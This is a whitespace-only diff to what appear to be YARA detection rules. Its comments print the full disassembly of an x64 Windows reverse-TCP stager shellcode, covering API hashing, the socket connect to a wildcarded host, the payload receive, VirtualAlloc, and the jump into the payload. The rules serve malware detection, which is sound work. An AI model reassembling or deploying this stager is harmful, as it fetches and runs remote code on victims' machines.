@@ -6,8 +6,8 @@
     
         /*
             FC                   | .                    | cld
-        4883E4F0             | H...                 | and rsp, 0xfffffffffffffff0
-        E8C8000000           | .....                | call start
+            4883E4F0             | H...                 | and rsp, 0xfffffffffffffff0
+            E8C8000000           | .....                | call start
         */
     
         strings:
@@ -25,14 +25,14 @@
     
         /*
             4151                 | AQ                   | push r9
-        4150                 | AP                   | push r8
-        52                   | R                    | push rdx
-        51                   | Q                    | push rcx
-        56                   | V                    | push rsi
-        4831D2               | H1.                  | xor rdx, rdx
-        65488B5260           | eH.R`                | mov rdx, [gs:rdx+96]
-        488B5218             | H.R.                 | mov rdx, [rdx+24]
-        488B5220             | H.R                  | mov rdx, [rdx+32]
+            4150                 | AP                   | push r8
+            52                   | R                    | push rdx
+            51                   | Q                    | push rcx
+            56                   | V                    | push rsi
+            4831D2               | H1.                  | xor rdx, rdx
+            65488B5260           | eH.R`                | mov rdx, [gs:rdx+96]
+            488B5218             | H.R.                 | mov rdx, [rdx+24]
+            488B5220             | H.R                  | mov rdx, [rdx+32]
         */
     
         strings:
@@ -50,8 +50,8 @@
     
         /*
             488B7250             | H.rP                 | mov rsi, [rdx+80]
-        480FB74A4A           | H..JJ                | movzx rcx, word [rdx+74]
-        4D31C9               | M1.                  | xor r9, r9
+            480FB74A4A           | H..JJ                | movzx rcx, word [rdx+74]
+            4D31C9               | M1.                  | xor r9, r9
         */
     
         strings:
@@ -69,10 +69,10 @@
     
         /*
             4831C0               | H1.                  | xor rax, rax
-        AC                   | .                    | lodsb
-        3C61                 | <a                   | cmp al, 'a'
-        7C02                 | |.                   | jl not_lowercase
-        2C20                 | ,                    | sub al, 0x20
+            AC                   | .                    | lodsb
+            3C61                 | <a                   | cmp al, 'a'
+            7C02                 | |.                   | jl not_lowercase
+            2C20                 | ,                    | sub al, 0x20
         */
     
         strings:
@@ -90,23 +90,23 @@
     
         /*
             41C1C90D             | A...                 | ror r9d, 13
-        4101C1               | A..                  | add r9d, eax
-        E2ED                 | ..                   | loop loop_modname
-        52                   | R                    | push rdx
-        4151                 | AQ                   | push r9
-        488B5220             | H.R                  | mov rdx, [rdx+32]
-        8B423C               | .B<                  | mov eax, dword [rdx+60]
-        4801D0               | H..                  | add rax, rdx
-        668178180B02         | f.x...               | cmp word [rax+24], 0x020b
-        7572                 | ur                   | jne get_next_mod1
-        8B8088000000         | ......               | mov eax, dword [rax+136]
-        4885C0               | H..                  | test rax, rax
-        7467                 | tg                   | jz get_next_mod1
-        4801D0               | H..                  | add rax, rdx
-        50                   | P                    | push rax
-        8B4818               | .H.                  | mov ecx, dword [rax+24]
-        448B4020             | D.@                  | mov r8d, dword [rax+32]
-        4901D0               | I..                  | add r8, rdx
+            4101C1               | A..                  | add r9d, eax
+            E2ED                 | ..                   | loop loop_modname
+            52                   | R                    | push rdx
+            4151                 | AQ                   | push r9
+            488B5220             | H.R                  | mov rdx, [rdx+32]
+            8B423C               | .B<                  | mov eax, dword [rdx+60]
+            4801D0               | H..                  | add rax, rdx
+            668178180B02         | f.x...               | cmp word [rax+24], 0x020b
+            7572                 | ur                   | jne get_next_mod1
+            8B8088000000         | ......               | mov eax, dword [rax+136]
+            4885C0               | H..                  | test rax, rax
+            7467                 | tg                   | jz get_next_mod1
+            4801D0               | H..                  | add rax, rdx
+            50                   | P                    | push rax
+            8B4818               | .H.                  | mov ecx, dword [rax+24]
+            448B4020             | D.@                  | mov r8d, dword [rax+32]
+            4901D0               | I..                  | add r8, rdx
         */
     
         strings:
@@ -124,10 +124,10 @@
     
         /*
             E356                 | .V                   | jrcxz get_next_mod
-        48FFC9               | H..                  | dec rcx
-        418B3488             | A.4.                 | mov esi, dword [r8+rcx*4]
-        4801D6               | H..                  | add rsi, rdx
-        4D31C9               | M1.                  | xor r9, r9
+            48FFC9               | H..                  | dec rcx
+            418B3488             | A.4.                 | mov esi, dword [r8+rcx*4]
+            4801D6               | H..                  | add rsi, rdx
+            4D31C9               | M1.                  | xor r9, r9
         */
     
         strings:
@@ -145,22 +145,22 @@
     
         /*
             4831C0               | H1.                  | xor rax, rax
-        AC                   | .                    | lodsb
-        41C1C90D             | A...                 | ror r9d, 13
-        4101C1               | A..                  | add r9d, eax
-        38E0                 | 8.                   | cmp al, ah
-        75F1                 | u.                   | jne loop_funcname
-        4C034C2408           | L.L$.                | add r9, [rsp+8]
-        4539D1               | E9.                  | cmp r9d, r10d
-        75D8                 | u.                   | jnz get_next_func
-        58                   | X                    | pop rax
-        448B4024             | D.@$                 | mov r8d, dword [rax+36]
-        4901D0               | I..                  | add r8, rdx
-        66418B0C48           | fA..H                | mov cx, [r8+2*rcx]
-        448B401C             | D.@.                 | mov r8d, dword [rax+28]
-        4901D0               | I..                  | add r8, rdx
-        418B0488             | A...                 | mov eax, dword [r8+4*rcx]
-        4801D0               | H..                  | add rax, rdx
+            AC                   | .                    | lodsb
+            41C1C90D             | A...                 | ror r9d, 13
+            4101C1               | A..                  | add r9d, eax
+            38E0                 | 8.                   | cmp al, ah
+            75F1                 | u.                   | jne loop_funcname
+            4C034C2408           | L.L$.                | add r9, [rsp+8]
+            4539D1               | E9.                  | cmp r9d, r10d
+            75D8                 | u.                   | jnz get_next_func
+            58                   | X                    | pop rax
+            448B4024             | D.@$                 | mov r8d, dword [rax+36]
+            4901D0               | I..                  | add r8, rdx
+            66418B0C48           | fA..H                | mov cx, [r8+2*rcx]
+            448B401C             | D.@.                 | mov r8d, dword [rax+28]
+            4901D0               | I..                  | add r8, rdx
+            418B0488             | A...                 | mov eax, dword [r8+4*rcx]
+            4801D0               | H..                  | add rax, rdx
         */
     
         strings:
@@ -178,16 +178,16 @@
     
         /*
             4158                 | AX                   | pop r8
-        4158                 | AX                   | pop r8
-        5E                   | ^                    | pop rsi
-        59                   | Y                    | pop rcx
-        5A                   | Z                    | pop rdx
-        4158                 | AX                   | pop r8
-        4159                 | AY                   | pop r9
-        415A                 | AZ                   | pop r10
-        4883EC20             | H..                  | sub rsp, 32
-        4152                 | AR                   | push r10
-        FFE0                 | ..                   | jmp rax
+            4158                 | AX                   | pop r8
+            5E                   | ^                    | pop rsi
+            59                   | Y                    | pop rcx
+            5A                   | Z                    | pop rdx
+            4158                 | AX                   | pop r8
+            4159                 | AY                   | pop r9
+            415A                 | AZ                   | pop r10
+            4883EC20             | H..                  | sub rsp, 32
+            4152                 | AR                   | push r10
+            FFE0                 | ..                   | jmp rax
         */
     
         strings:
@@ -205,9 +205,9 @@
     
         /*
             4159                 | AY                   | pop r9
-        5A                   | Z                    | pop rdx
-        488B12               | H..                  | mov rdx, [rdx]
-        E94FFFFFFF           | .O...                | jmp next_mod
+            5A                   | Z                    | pop rdx
+            488B12               | H..                  | mov rdx, [rdx]
+            E94FFFFFFF           | .O...                | jmp next_mod
         */
     
         strings:
@@ -225,39 +225,39 @@
     
         /*
             49BE7773325F33320000 | I.ws2_32..           | mov r14, 'ws2_32'
-        4156                 | AV                   | push r14
-        4989E6               | I..                  | mov r14, rsp
-        4881ECA0010000       | H......              | sub rsp, 408+8
-        4989E5               | I..                  | mov r13, rsp
-        49BC0200115C???????? | I....\....           | mov r12, 0x0100007f5c110002	; Host
-        4154                 | AT                   | push r12
-        4989E4               | I..                  | mov r12, rsp
-        4C89F1               | L..                  | mov rcx, r14
-        41BA4C772607         | A.Lw&.               | mov r10d, 0x0726774c
-        FFD5                 | ..                   | call rbp
-        4C89EA               | L..                  | mov rdx, r13
-        6801010000           | h....                | push 0x0101
-        59                   | Y                    | pop rcx
-        41BA29806B00         | A.).k.               | mov r10d, 0x006b8029
-        FFD5                 | ..                   | call rbp
-        50                   | P                    | push rax
-        50                   | P                    | push rax
-        4D31C9               | M1.                  | xor r9, r9
-        4D31C0               | M1.                  | xor r8, r8
-        48FFC0               | H..                  | inc rax
-        4889C2               | H..                  | mov rdx, rax
-        48FFC0               | H..                  | inc rax
-        4889C1               | H..                  | mov rcx, rax
-        41BAEA0FDFE0         | A.....               | mov r10d, 0xe0df0fea
-        FFD5                 | ..                   | call rbp
-        4889C7               | H..                  | mov rdi, rax
-        6A10                 | j.                   | push byte 16
-        4158                 | AX                   | pop r8
-        4C89E2               | L..                  | mov rdx, r12
-        4889F9               | H..                  | mov rcx, rdi
-        41BA99A57461         | A...ta               | mov r10d, 0x6174a599
-        FFD5                 | ..                   | call rbp
-        4881C440020000       | H..@...              | add rsp, ( (408+8) + (8*4) + (32*4) )
+            4156                 | AV                   | push r14
+            4989E6               | I..                  | mov r14, rsp
+            4881ECA0010000       | H......              | sub rsp, 408+8
+            4989E5               | I..                  | mov r13, rsp
+            49BC0200115C???????? | I....\....           | mov r12, 0x0100007f5c110002	; Host
+            4154                 | AT                   | push r12
+            4989E4               | I..                  | mov r12, rsp
+            4C89F1               | L..                  | mov rcx, r14
+            41BA4C772607         | A.Lw&.               | mov r10d, 0x0726774c
+            FFD5                 | ..                   | call rbp
+            4C89EA               | L..                  | mov rdx, r13
+            6801010000           | h....                | push 0x0101
+            59                   | Y                    | pop rcx
+            41BA29806B00         | A.).k.               | mov r10d, 0x006b8029
+            FFD5                 | ..                   | call rbp
+            50                   | P                    | push rax
+            50                   | P                    | push rax
+            4D31C9               | M1.                  | xor r9, r9
+            4D31C0               | M1.                  | xor r8, r8
+            48FFC0               | H..                  | inc rax
+            4889C2               | H..                  | mov rdx, rax
+            48FFC0               | H..                  | inc rax
+            4889C1               | H..                  | mov rcx, rax
+            41BAEA0FDFE0         | A.....               | mov r10d, 0xe0df0fea
+            FFD5                 | ..                   | call rbp
+            4889C7               | H..                  | mov rdi, rax
+            6A10                 | j.                   | push byte 16
+            4158                 | AX                   | pop r8
+            4C89E2               | L..                  | mov rdx, r12
+            4889F9               | H..                  | mov rcx, rdi
+            41BA99A57461         | A...ta               | mov r10d, 0x6174a599
+            FFD5                 | ..                   | call rbp
+            4881C440020000       | H..@...              | add rsp, ( (408+8) + (8*4) + (32*4) )
         */
     
         strings:
@@ -275,26 +275,26 @@
     
         /*
             4883EC10             | H...                 | sub rsp, 16
-        4889E2               | H..                  | mov rdx, rsp
-        4D31C9               | M1.                  | xor r9, r9
-        6A04                 | j.                   | push byte 4
-        4158                 | AX                   | pop r8
-        4889F9               | H..                  | mov rcx, rdi
-        41BA02D9C85F         | A...._               | mov r10d, 0x5fc8d902
-        FFD5                 | ..                   | call rbp
-        4883C420             | H..                  | add rsp, 32
-        5E                   | ^                    | pop rsi
-        89F6                 | ..                   | mov esi, esi
-        6A40                 | j@                   | push byte 0x40
-        4159                 | AY                   | pop r9
-        6800100000           | h....                | push 0x1000
-        4158                 | AX                   | pop r8
-        4889F2               | H..                  | mov rdx, rsi
-        4831C9               | H1.                  | xor rcx, rcx
-        41BA58A453E5         | A.X.S.               | mov r10d, 0xe553a458
-        FFD5                 | ..                   | call rbp
-        4889C3               | H..                  | mov rbx, rax
-        4989C7               | I..                  | mov r15, rax
+            4889E2               | H..                  | mov rdx, rsp
+            4D31C9               | M1.                  | xor r9, r9
+            6A04                 | j.                   | push byte 4
+            4158                 | AX                   | pop r8
+            4889F9               | H..                  | mov rcx, rdi
+            41BA02D9C85F         | A...._               | mov r10d, 0x5fc8d902
+            FFD5                 | ..                   | call rbp
+            4883C420             | H..                  | add rsp, 32
+            5E                   | ^                    | pop rsi
+            89F6                 | ..                   | mov esi, esi
+            6A40                 | j@                   | push byte 0x40
+            4159                 | AY                   | pop r9
+            6800100000           | h....                | push 0x1000
+            4158                 | AX                   | pop r8
+            4889F2               | H..                  | mov rdx, rsi
+            4831C9               | H1.                  | xor rcx, rcx
+            41BA58A453E5         | A.X.S.               | mov r10d, 0xe553a458
+            FFD5                 | ..                   | call rbp
+            4889C3               | H..                  | mov rbx, rax
+            4989C7               | I..                  | mov r15, rax
         */
     
         strings:
@@ -312,16 +312,16 @@
     
         /*
             4D31C9               | M1.                  | xor r9, r9
-        4989F0               | I..                  | mov r8, rsi
-        4889DA               | H..                  | mov rdx, rbx
-        4889F9               | H..                  | mov rcx, rdi
-        41BA02D9C85F         | A...._               | mov r10d, 0x5fc8d902
-        FFD5                 | ..                   | call rbp
-        4801C3               | H..                  | add rbx, rax
-        4829C6               | H).                  | sub rsi, rax
-        4885F6               | H..                  | test rsi, rsi
-        75E1                 | u.                   | jnz short read_more
-        41FFE7               | A..                  | jmp r15
+            4989F0               | I..                  | mov r8, rsi
+            4889DA               | H..                  | mov rdx, rbx
+            4889F9               | H..                  | mov rcx, rdi
+            41BA02D9C85F         | A...._               | mov r10d, 0x5fc8d902
+            FFD5                 | ..                   | call rbp
+            4801C3               | H..                  | add rbx, rax
+            4829C6               | H).                  | sub rsi, rax
+            4885F6               | H..                  | test rsi, rsi
+            75E1                 | u.                   | jnz short read_more
+            41FFE7               | A..                  | jmp r15
         */
     
         strings:
